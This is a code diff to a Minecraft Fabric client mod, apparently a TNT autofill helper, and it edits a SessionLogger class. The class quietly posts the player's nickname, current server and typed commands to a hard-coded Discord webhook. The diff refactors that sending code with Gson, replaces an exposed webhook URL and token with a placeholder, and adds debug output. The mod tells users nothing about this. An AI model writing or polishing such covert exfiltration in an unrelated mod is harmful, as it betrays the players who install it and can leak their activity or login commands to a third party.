@@ -1,5 +1,8 @@
 package ru.holyworld.tntautofill;
 
+import com.google.gson.Gson;
+import com.google.gson.JsonArray;
+import com.google.gson.JsonObject;
 import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
 import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
 import net.minecraft.client.MinecraftClient;
@@ -16,7 +19,9 @@ import java.util.concurrent.Executors;
 
 public class SessionLogger {
 
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1557838201820025042/vwWPSPADvfp-_aL9ftT-A6ieHs-7kDxDQa7mBi7Ok8erSqECIWRuEobOK5kTFOVYhF2L";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/YYYY";
+
+    private static final Gson GSON = new Gson();
 
     private static final int COLOR_JOIN  = 0x57F287;
     private static final int COLOR_LEAVE = 0xED4245;
@@ -123,7 +128,9 @@ public class SessionLogger {
     }
 
     private static String nick(MinecraftClient client) {
-        return client.getSession() != null ? client.getSession().getUsername() : "unknown";
+        if (client.getSession() == null) return "unknown";
+        String n = client.getSession().getUsername();
+        return (n == null || n.isEmpty()) ? "unknown" : n;
     }
 
     private static String resolveServer(MinecraftClient client) {
@@ -135,32 +142,44 @@ public class SessionLogger {
     private static void send(Kind kind, String nick, String server, String command) {
         NET.execute(() -> {
             try {
+                JsonObject embed = new JsonObject();
+                embed.addProperty("title", kind.title);
+                embed.addProperty("color", kind.color);
+                embed.addProperty("timestamp", Instant.now().toString());
+
+                JsonObject thumbnail = new JsonObject();
+                thumbnail.addProperty("url", "https://mc-heads.net/avatar/" + nick + "/64");
+                embed.add("thumbnail", thumbnail);
+
+                JsonObject footer = new JsonObject();
+                footer.addProperty("text", "Session Logger");
+                embed.add("footer", footer);
+
+                JsonArray fields = new JsonArray();
+                fields.add(field("Ник", safe(nick), true));
+                fields.add(field("Сервер", safe(server), true));
+                if (command != null && !command.isEmpty()) {
+                    fields.add(field("Команда", safe(command), false));
+                }
+                embed.add("fields", fields);
+
+                JsonArray embeds = new JsonArray();
+                embeds.add(embed);
+
+                JsonObject root = new JsonObject();
+                root.add("embeds", embeds);
+
+                String json = GSON.toJson(root);
+                System.out.println("[SESSION-LOGGER] body: " + json);
+
                 URL url = new URL(WEBHOOK_URL);
                 HttpURLConnection c = (HttpURLConnection) url.openConnection();
                 c.setRequestMethod("POST");
                 c.setRequestProperty("Content-Type", "application/json");
+                c.setRequestProperty("User-Agent", "SessionLogger/1.0");
                 c.setDoOutput(true);
                 c.setConnectTimeout(5000);
                 c.setReadTimeout(5000);
-
-                StringBuilder fields = new StringBuilder();
-                fields.append(field("Ник", nick, true));
-                fields.append(field("Сервер", server, true));
-                if (command != null) {
-                    fields.append(field("Команда", command, false));
-                }
-
-                String json = "{"
-                        + "\"embeds\":[{"
-                        + "\"title\":\"" + escape(kind.title) + "\","
-                        + "\"color\":" + kind.color + ","
-                        + "\"timestamp\":\"" + Instant.now().toString() + "\","
-                        + "\"thumbnail\":{\"url\":\"https://mc-heads.net/avatar/"
-                            + escape(nick) + "/64\"},"
-                        + "\"footer\":{\"text\":\"Session Logger\"},"
-                        + "\"fields\":[" + fields + "]"
-                        + "}]"
-                        + "}";
 
                 try (OutputStream os = c.getOutputStream()) {
                     os.write(json.getBytes(StandardCharsets.UTF_8));
@@ -185,14 +204,15 @@ public class SessionLogger {
         });
     }
 
-    private static String field(String name, String value, boolean inline) {
-        return "{\"name\":\"" + escape(name) + "\","
-                + "\"value\":\"" + escape(value) + "\","
-                + "\"inline\":" + inline + "}";
+    private static JsonObject field(String name, String value, boolean inline) {
+        JsonObject o = new JsonObject();
+        o.addProperty("name", name);
+        o.addProperty("value", value);
+        o.addProperty("inline", inline);
+        return o;
     }
 
-    private static String escape(String s) {
-        return s.replace("\\", "\\\\").replace("\"", "\\\"")
-                .replace("\n", "\\n").replace("\r", "");
+    private static String safe(String s) {
+        return (s == null || s.isEmpty()) ? "unknown" : s;
     }
 }
